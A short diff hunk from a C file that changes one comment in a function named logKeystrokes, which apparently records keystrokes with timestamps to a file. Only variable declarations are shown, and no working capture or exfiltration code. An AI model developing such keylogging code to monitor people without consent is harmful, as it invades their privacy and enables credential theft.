@@ -8,7 +8,7 @@
 
 void logKeystrokes(const char *filename, char key) {
     FILE *file;
-    int keyState[256] = {0};  // Zustand der Tasten
+    int keyState[256] = {0};  // Gets the state of the key according to AsCII values
     bool shiftPressed;
     int c;
     char timestamp[30];
